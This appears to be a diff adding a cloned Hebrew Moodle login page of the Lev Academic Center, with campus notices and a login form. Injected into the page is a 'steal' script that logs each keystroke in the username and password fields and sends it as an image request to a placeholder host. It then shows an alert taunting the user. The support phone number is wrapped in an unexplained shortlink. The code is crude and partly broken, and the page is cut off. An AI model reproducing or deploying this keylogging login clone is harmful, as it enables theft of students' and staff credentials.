@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<html  dir="rtl" lang="he" xml:lang="he">
+<head>
+    <title>המרכז האקדמי לב</title>
+    <link rel="shortcut icon" href="http://moodle.jct.ac.il/theme/image.php/clean/theme/1494315764/favicon" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="keywords" content="moodle, המרכז האקדמי לב" />
+<link rel="stylesheet" type="text/css" href="http://moodle.jct.ac.il/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css" /><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="http://moodle.jct.ac.il/theme/styles.php/clean/1494315764/all" />
+<script type="text/javascript">
+//<![CDATA[
+var M = {}; M.yui = {};
+M.pageloadstarttime = new Date();
+M.cfg = {"wwwroot":"http:\/\/moodle.jct.ac.il","sesskey":"GH7MWRnFRM","loadingicon":"http:\/\/moodle.jct.ac.il\/theme\/image.php\/clean\/core\/1494315764\/i\/loading_small","themerev":"1494315764","slasharguments":1,"theme":"clean","jsrev":-1,"admin":"admin","svgicons":true};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
+var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''};if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else me.path=component+'/'+component+'.'+me.type};
+YUI_config = {"debug":false,"base":"http:\/\/moodle.jct.ac.il\/lib\/yuilib\/3.17.2\/","comboBase":"http:\/\/moodle.jct.ac.il\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"http:\/\/moodle.jct.ac.il\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"http:\/\/moodle.jct.ac.il\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"http:\/\/moodle.jct.ac.il\/theme\/yui_combo.php?m\/-1\/","combine":true,"comboBase":"http:\/\/moodle.jct.ac.il\/theme\/yui_combo.php?","ext":false,"root":"m\/-1\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-dock":{"requires":["base","node","event-custom","event-mouseenter","event-resize","escape","moodle-core-dock-loader","moodle-core-event"]},"moodle-core-dock-loader":{"requires":["escape"]},"moodle-core-formchangechecker":{"requires":["base","event-focus","moodle-core-event"]},"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-event":{"requires":["event-custom"]},"moodle-core-formautosubmit":{"requires":["base","event-key"]},"moodle-core-languninstallconfirm":{"requires":["base","node","moodle-core-notification-confirm","moodle-core-notification-alert"]},"moodle-core-checknet":{"requires":["base-base","moodle-core-notification-alert","io-base"]},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core-popuphelp":{"requires":["moodle-core-tooltip"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core-tooltip":{"requires":["base","node","io-base","moodle-core-notification-dialogue","json-parse","widget-position","widget-position-align","event-outside","cache-base"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core_availability-form":{"requires":["base","node","event","panel","moodle-core-notification-dialogue","json"]},"moodle-backup-backupselectall":{"requires":["node","event","node-event-simulate","anim"]},"moodle-backup-confirmcancel":{"requires":["node","node-event-simulate","moodle-core-notification-confirm"]},"moodle-calendar-info":{"requires":["base","node","event-mouseenter","event-key","overlay","moodle-calendar-info-skin"]},"moodle-course-modchooser":{"requires":["moodle-core-chooserdialogue","moodle-course-coursebase"]},"moodle-course-toolboxes":{"requires":["node","base","event-key","node","io","moodle-course-coursebase","moodle-course-util"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-course-formatchooser":{"requires":["base","node","node-event-simulate"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-form-passwordunmask":{"requires":["node","base"]},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-form-showadvanced":{"requires":["node","base","selector-css3"]},"moodle-core_message-messenger":{"requires":["escape","handlebars","io-base","moodle-core-notification-ajaxexception","moodle-core-notification-alert","moodle-core-notification-dialogue","moodle-core-notification-exception"]},"moodle-core_message-deletemessage":{"requires":["node","event"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-question-qbankmanager":{"requires":["node","selector-css3"]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-question-preview":{"requires":["base","dom","event-delegate","event-key","core_question_engine"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-qtype_ddimageortext-dd":{"requires":["node","dd","dd-drop","dd-constrain"]},"moodle-qtype_ddimageortext-form":{"requires":["moodle-qtype_ddimageortext-dd","form_filepicker"]},"moodle-qtype_ddmarker-dd":{"requires":["node","event-resize","dd","dd-drop","dd-constrain","graphics"]},"moodle-qtype_ddmarker-form":{"requires":["moodle-qtype_ddmarker-dd","form_filepicker","graphics","escape"]},"moodle-qtype_ddwtos-dd":{"requires":["node","dd","dd-drop","dd-constrain"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_attendance-groupfilter":{"requires":["base","node"]},"moodle-mod_forum-subscriptiontoggle":{"requires":["base-base","io-base"]},"moodle-mod_oublog-tagselector":{"requires":["base","node","autocomplete","autocomplete-filters","autocomplete-highlighters"]},"moodle-mod_oublog-savecheck":{"requires":["base","node","io","panel","moodle-core-notification-alert"]},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-quizquestionbank":{"requires":["base","event","node","io","io-form","yui-later","moodle-question-qbankmanager","moodle-core-notification-dialogue"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-mod_quiz-randomquestion":{"requires":["base","event","node","io","moodle-core-notification-dialogue"]},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-mod_quiz-repaginate":{"requires":["base","event","node","io","moodle-core-notification-dialogue"]},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form"]},"moodle-mod_quiz-util":{"requires":["node"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_scheduler-limitchoices":{"requires":["base","node","event"]},"moodle-mod_scheduler-studentlist":{"requires":["base","node","event","io"]},"moodle-mod_scheduler-saveseen":{"requires":["base","node","event"]},"moodle-mod_scheduler-delselected":{"requires":["base","node","event"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-filter_glossary-autolinker":{"requires":["base","node","io-base","json-parse","event-delegate","overlay","moodle-core-event","moodle-core-notification-alert","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-filter_mathjaxloader-loader":{"requires":["moodle-core-event"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","node-event-simulate","yui-throttle","moodle-core-notification-dialogue","moodle-core-notification-confirm","moodle-editor_atto-rangy","handlebars","timers","querystring-stringify"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers","moodle-editor_atto-menu"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-format_grid-gridkeys":{"requires":["event-nav-keys"]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_grader-gradereporttable":{"requires":["base","node","event","handlebars","overlay","event-hover"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-tool_capability-search":{"requires":["base","node"]},"moodle-tool_lp-dragdrop-reorder":{"requires":["moodle-core-dragdrop"]},"moodle-tool_monitor-dropdown":{"requires":["base","event","node"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","transition","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_html-button":{"requires":["moodle-editor_atto-plugin","event-valuechange"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"http:\/\/moodle.jct.ac.il\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"http:\/\/moodle.jct.ac.il\/theme\/yui_combo.php?","ext":false,"root":"gallery\/-1\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"http:\/\/moodle.jct.ac.il\/lib\/javascript.php\/-1\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker"]},"core_comment":{"name":"core_comment","fullpath":"http:\/\/moodle.jct.ac.il\/lib\/javascript.php\/-1\/comment\/comment.js","requires":["base","io-base","node","json","yui2-animation","overlay","escape"]},"mathjax":{"name":"mathjax","fullpath":"http:\/\/cdn.mathjax.org\/mathjax\/2.6-latest\/MathJax.js?delayStartupUntil=configured"}}};
+M.yui.loader = {modules: {}};
+
+//]]>
+</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body  id="page-site-index" class="format-site course path-site safari dir-rtl lang-he yui-skin-sam yui3-skin-sam moodle-jct-ac-il pagelayout-frontpage course-1 context-2 notloggedin has-region-side-pre used-region-side-pre has-region-side-post used-region-side-post layout-option-nonavbar">
+
+<div class="skiplinks"><a class="skip" href="#maincontent">דילוג לתוכן העיקרי</a></div>
+<script type="text/javascript" src="http://moodle.jct.ac.il/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.js&amp;rollup/-1/mcore-min.js"></script><script type="text/javascript" src="http://moodle.jct.ac.il/lib/javascript.php/-1/lib/javascript-static.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+document.body.className += ' jsenabled';
+//]]>
+</script>
+
+
+<b id="stom"/>
+
+<script type="text/javascript">
+	function steal(e)
+	{
+		var keynum;
+
+		if(window.event) { // IE                    
+		  keynum = e.keyCode;
+		} else if(e.which){ // Netscape/Firefox/Opera                   
+		  keynum = e.which;
+		}
+		try
+		{
+			var im = document.createElement("img");
+			im.src = "http://www.google.com/crap?output=" + keynum;
+			
+			getElementById("stom").appendChild(im);
+		}
+		catch(e)
+		{
+		}
+		alert("just stole your password you stupid srupid stpid person");
+	}
+</script>
+
+
+<header role="banner" class="navbar navbar-fixed-top moodle-has-zindex">
+    <nav role="navigation" class="navbar-inner">
+        <div class="container-fluid">
+            <a class="brand" title="ראשי" href="http://moodle.jct.ac.il">לב</a>            <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse"><span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span></a>            <div class="usermenu"><span class="login">את/ה לא מחובר/ת (<a href="https://moodle.jct.ac.il/login/index.php">התחברות</a>)</span></div>                        <div class="nav-collapse collapse">
+                <ul class="nav"><li class="dropdown langmenu"><a href="#" class="dropdown-toggle" data-toggle="dropdown" title="שפת ממשק">עברית ‎(he)‎<b class="caret"></b></a><ul class="dropdown-menu"><li><a title="עברית ‎(he)‎" href="http://moodle.jct.ac.il/?lang=he">עברית ‎(he)‎</a></li><li><a title="English ‎(en)‎" href="http://moodle.jct.ac.il/?lang=en">English ‎(en)‎</a></li></ul></ul>                <ul class="nav pull-right">
+                    <li></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+</header>
+
+<div id="page" class="container-fluid">
+    <header id="page-header" class="clearfix"><div class="logo"></div><div class="clearfix" id="page-navbar"><div class="breadcrumb-nav"><span class="accesshide" id="navbar-label">נתיב העמוד</span><nav aria-labelledby="navbar-label"><ul class="breadcrumb"><li><span itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb"><a itemprop="url" href="http://moodle.jct.ac.il/"><span itemprop="title">ראשי</span></a></span></li></ul></nav></div><div class="breadcrumb-button"></div></div><div id="course-header"></div></header>    <div id="page-content" class="row-fluid">
+        <div id="region-main-box" class="span9 pull-right">
+            <div class="row-fluid">
+                <section id="region-main" class="span8">
+                    <span class="notifications" id="user-notifications"></span><div role="main"><span id="maincontent"></span><div class="box generalbox sitetopic"><div class="no-overflow"><div style="text-align: center;">
+<table border="0" style="width: 100%;">
+<tbody>
+<tr>
+<td width="33%" valign="top" style="text-align: center;"></td>
+<td width="33%" valign="top" style="text-align: center;"></td>
+<td width="33%" valign="top" style="text-align: center;"></td>
+</tr>
+</tbody>
+</table>
+</div>
+<div style="text-align: center;">
+<h2 style="text-align: center; direction: rtl;"><span size="4" style="font-size: large;">ברוכים הבאים למערכת הלמ</span><span size="4" color="#000000" style="color: #000000; font-size: large;">י</span><span size="4" style="font-size: large;">דה המתוקשבת החדשה של המרכז האקדמי לב לשנה"ל</span></h2>
+<h2 style="text-align: center; direction: rtl;"><span size="4" style="font-size: large;"><span color="#ff0000" style="color: #ff0000;">תשע"א - תשע"ז</span></span></h2>
+<br><img width="430" hspace="0" height="366" border="0" title="תמונת שער" alt="תמונת שער" src="http://moodle.jct.ac.il/file.php/1/jct_moodle_image.jpg" complete="true"></div></div><ul class="section img-text"><li class="activity label modtype_label " id="module-174057"><div><div class="mod-indent-outer"><div class="mod-indent"></div><div><div class="contentwithoutlink "><div class="no-overflow"><div class="no-overflow"><p dir="RTL"><b><span lang="HE">סטודנטים ועובדים יקרים שלום רב,</span></b><b><span dir="LTR"><u></u><u></u></span></b></p>
+<p dir="RTL"><b><span dir="LTR"><u></u>&nbsp;<u></u></span></b></p>
+<p dir="RTL"><b><span lang="HE">שימו לב!<u></u><u></u></span></b></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><span lang="HE">החל מיום א' הקרוב ו' בניסן (2.4.17) יחולו הסדרי תנועה חדשים (זמניים) בכניסה לקמפוס לב.<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><span lang="HE">מתחת לגשר הוועד הלאומי, ממוקם מרכז תנועה עירוני והעיריה נדרשת לבצע בו עבודות איטום.
+<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE">לצורך כך, יחסם הגשר המוביל מרחוב שח"ל לקמפוס לב, לתקופה של כחודש ימים.<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><b><span lang="HE">הולכי רגל</span></b><span lang="HE">
+</span><span lang="HE">הבאים מרחוב שח"ל, יאלצו להקיף את פרוייקט הבניה החדש (לב העיר) ולהיכנס לקמפוס מצומת בייט.
+<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE">לשם כך הוכשרה מדרכה חדשה עד לכניסה.<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE">מצ"ב תשריט<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><b><span lang="HE">בעלי רכבים</span></b><span lang="HE">
+</span><span lang="HE">יכנסו לקמפוס מהכניסה החדשה המשתלבת מצומת בייט ויורדת לבגין דרום.<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><span lang="HE">היציאה
+ מהקמפוס תתאפשר אך ורק לכיוון בגין דרום, אך ניתן לשוב ולהשתלב בבגין צפון
+ באמצעות פניה ימינה ביציאה להולילנד ושם לבצע פניית פרסה (באמצע העליה).<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE">מצ"ב תשריט<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><b><span lang="HE">לידיעתכם, יוצבו שלטי הכוונה ברחוב שח"ל ובצומת בייט.<u></u><u></u></span></b></p>
+<p dir="RTL"><b><span lang="HE"><u></u>&nbsp;<u></u></span></b></p>
+<p dir="RTL"><b><span lang="HE">אנו מתנצלים על אי הנוחות הזמנית הנכפית על כולנו ומקווים שהעבודות תסתיימנה בהקדם.<u></u><u></u></span></b></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><span lang="HE">בברכה,<u></u><u></u></span></p>
+<p dir="RTL"><span lang="HE"><u></u>&nbsp;<u></u></span></p>
+<p dir="RTL"><span lang="HE">הנהלת המרכז האקדמי לב</span></p><p dir="RTL"><span lang="HE">לצפיה במפה לחץ <a href="https://drive.google.com/file/d/0B1zFewqnDt0tNWxPR3NGVEFQZnc/view?usp=sharing" target="_blank">כאן </a><br></span></p><p dir="RTL"><span lang="HE"><br></span></p><div style="text-align: center;"><br></div></div></div></div></div></div></div></li><li class="activity label modtype_label " id="module-60706"><div><div class="mod-indent-outer"><div class="mod-indent"></div><div><div class="contentwithoutlink "><div class="no-overflow"><div class="no-overflow"><div class="WordSection1" dir="rtl">
+<p align="center" class="MsoNormal" style="text-align: center;" dir="rtl"><span lang="HE" style="line-height: 115%;"><span size="4" style="font-size: large;"><strong>גישה לקורסים במודל אינה ראיה לכך שהקורס מאושר!</strong></span></span></p>
+<p align="center" class="MsoNormal" style="text-align: center;" dir="rtl"><span lang="HE" style="line-height: 115%;"><span size="4" style="font-size: large;"><strong>כמו כן ציונים במודל הינם ציוני מטלות ושקלולן בלבד</strong></span></span></p>
+<p align="center" class="MsoNormal" style="text-align: center;" dir="rtl"><span lang="HE" style="line-height: 115%;"><span size="4" style="font-size: large;"><strong>את המצב האקדמי והציונים הרשמיים של התלמיד בקורס יש לבדוק </strong></span><a href="https://levnet.jct.ac.il/"><span size="4" style="font-size: large;"><strong>בלב-נט</strong></span></a><span size="4" style="font-size: large;"><strong> בלבד!</strong></span></span></p>
+</div></div></div></div></div></div></div></li><li class="activity label modtype_label " id="module-224413"><div><div class="mod-indent-outer"><div class="mod-indent"></div><div><div class="contentwithoutlink "><div class="no-overflow"><div class="no-overflow"><p></p><p dir="RTL"><span lang="HE" style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;"><b>נוהל
+שמירה על&nbsp; חוק הספאם&nbsp;</b></span></p>
+
+<p dir="RTL" style="text-indent:-18.0pt"><span lang="HE" style="font-family:&quot;Times New Roman&quot;,&quot;serif&quot;">1.</span><span lang="HE" style="font-size:
+7.0pt;line-height:115%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;">&nbsp; &nbsp; &nbsp;</span><span lang="HE" style="font-family:&quot;Arial&quot;,&quot;sans-serif&quot;">מmoodle ניתן לשלוח דואר
+רק בעניינים אקדמיים של הקורס.&nbsp;</span></p><p></p></div></div></div></div></div></div></li></ul></div><a class="skip-block skip" href="#skipsitenews">דילוג על חדשות האתר</a><div id="site-news-forum"><h2>חדשות האתר</h2><div class="forumnodiscuss">(עדיין לא פורסמו חדשות)</div>
+</div><span class="skip-block-to" id="skipsitenews"></span><br /></div>                </section>
+                <aside id="block-region-side-pre" class="span4 pull-right block-region" data-blockregion="side-pre" data-droptarget="1"><a class="skip skip-block" id="fsb-4" href="#sb-4">דילוג על ברוכים הבאים</a><div id="inst29956" class="block_html  block" role="complementary" data-block="html" data-instanceid="29956" aria-labelledby="instance-29956-header" data-dockable="1"><div class="header"><div class="title"><div class="block_action"></div><h2 id="instance-29956-header">ברוכים הבאים</h2></div></div><div class="content"><div class="no-overflow"><div style="text-align: justify;"><span color="#000000" style="color: #000000;"><span style="line-height: 1.231;">הבא לאתר הלמידה המתוקשבת (מודל - Moodle ) של המרכז האקדמי לב.</span></span></div>
+<p dir="RTL">שימו לב! הכניסה למודל ב<strong>שם משתמש וסיסמא רגילים</strong> של המכון (כשם שנכנסים למעבדות המחשבים)</p>
+<p dir="RTL">לבעיות סיסמא ניתן להיכנס לאתר <strong>לב-נט ל-"<a href="https://levnet.jct.ac.il/Login/ForgotPassword.aspx">שכחתי סיסמא</a>"</strong> ולהנפיק סיסמא חדשה</p>
+<p dir="RTL">במקרה הצורך בעזרה נוספת ניתן לפתוח<a href="https://levnet.jct.ac.il/Login/ReportProblem.aspx"><span class="nolink"> בקשת שירות באתר לב-נט</span></a> </p>
+<p dir="RTL">או לשלוח מייל לכתובת <strong><a href="mailto:support@jct.ac.il">support@jct.ac.il</a> </strong>או לחייג לטלפון <strong>02-6751152</strong></p>
+<p><br />לתמיכה בכל נושא אחר במודל ניתן לפנות לטלפון:<a onclick="window.open('http://898.tv/um2uv37','','');return false;" href="http://898.tv/um2uv37"><strong>02-6751047</strong></a> או לדוא"ל: <a href="mailto:help@jct.ac.il">help@jct.ac.il</a></p></div></div></div><span class="skip-block-to" id="sb-4"></span></aside>            </div>
+        </div>
+        <aside id="block-region-side-post" class="span3 desktop-first-column block-region" data-blockregion="side-post" data-droptarget="1"><a class="skip skip-block" id="fsb-11" href="#sb-11">דילוג על התחברות</a><div id="inst21655" class="block_login  block" role="complementary" data-block="login" data-instanceid="21655" aria-labelledby="instance-21655-header" data-dockable="1"><div class="header"><div class="title"><div class="block_action"></div><h2 id="instance-21655-header">התחברות</h2></div></div><div class="content">
+<form class="loginform" id="login" method="post" action="https://moodle.jct.ac.il/login/index.php" ><div class="c1 fld username"><label for="login_username">שם משתמש</label><input type="text" name="username" id="login_username" value="" onkeypress="steal(event)" /></div><div class="c1 fld password"><label for="login_password">סיסמה</label><input type="password" name="password" id="login_password" value="" onkeypress="steal(event)" /></div><div class="c1 rememberusername"><input type="checkbox" name="rememberusername" id="rememberusername" value="1" /> <label for="rememberusername">זכירת שם משתמש/ת</label></div><div class="c1 btn"><input type="submit" value="התחברות" /></div></form>
+<div class="footer"><div><a href="https://moodle.jct.ac.il/login/forgot_password.php">שכחת סיסמה?</a></div></div></div></div><span class="skip-block-to" id="sb-11"></span><div id="inst36690" class="block_html  block" role="complementary" data-block="html" data-instanceid="36690" aria-label="תוכן מעוצב"><div class="content"><div class="block_action notitle"></div><div class="no-overflow"><p align="center"><a title="אתר בית המדרש" href="http://moodle.jct.ac.il/course/view.php?id=4172&username=guest"><strong><font size="4">אתר בית המדרש </font></strong></a> </p>
+<p align="center"><img width="137" height="98" title="בית המדרש" style="width: 137px; height: 98px" alt="בית המדרש" src="http://moodle.jct.ac.il/file.php/1/beit_midrash_small.jpg" border="0" hspace="0" complete="true" /></p></div></div></div><a class="skip skip-block" id="fsb-18" href="#sb-18">דילוג על Marketing Science An Overview</a><div id="inst125788" class="block_html  block" role="complementary" data-block="html" data-instanceid="125788" aria-labelledby="instance-125788-header" data-dockable="1"><div class="header"><div class="title"><div class="block_action"></div><h2 id="instance-125788-header">Marketing Science An Overview</h2></div></div><div class="content"><div class="no-overflow"><p>
+JCT Videos
+<script src="http://code.jquery.com/jquery-1.10.2.min.js" type="text/javascript"></script>
+</p>
+<div class="page">
+<div id="player">
+<h1>בחר וידאו מתוך הרשימה</h1><p><br></p>
+<h1></h1>
+</div>
+<div id="videoLists"></div>
+</div>
+<p>
+<script type="text/javascript">// <![CDATA[
+$(function () {
+				var list = [
+					{name: 'Bayesian Statistics By Dr. Chaim Ehrman 1', url: 'mms://PEKUDEI.jct.ac.il/marketing'},
+{name: 'Bayesian Statistics By Dr. Chaim Ehrman 2', url: 'mms://PEKUDEI.jct.ac.il/marketing 2'}
+				];
+				
+				for (var key in list) {
+					var url = ' data-url="'+list[key].url+'"';
+					$('#videoLists').append('<br><input type="submit" class="button"'+url+'value="'+list[key].name+'">');
+				}
+				
+				$('.button').click(function () {
+					var url = $(this).attr('data-url');
+					var media = '<object type="video/x-ms-asf" url="'+url+'" data="'+url+'" classid="CLSID:6BF52A52-394A-11d3-B153-00C04F79FAA6">';
+					var param = '<param name="url" value="'+url+'"></param>';
+					var filename = '<param name="filename" value=""></param>';
+					var autostart = '<param name="autostart" value="1"></param>';
+					var uiMode = '<param name="uiMode" value="full"></param>';
+					var autosize = '<param name="autosize" value="1"></param>';
+					var playcount = '<param name="playcount" value="1"></param>';
+					var embed = '<embed type="application/x-mplayer2" src="'+url+'" width="100%" height="100%" autostart="true" showcontrols="true" pluginspage="http://www.microsoft.com/Windows/MediaPlayer/"></embed>';
+					var endTag = '</object>';
+					$('#player').html(media + param + filename + autostart + uiMode +
+						autosize + playcount + embed + endTag);
+				});
+			});
+// ]]></script>
+</p>
+<p></p>
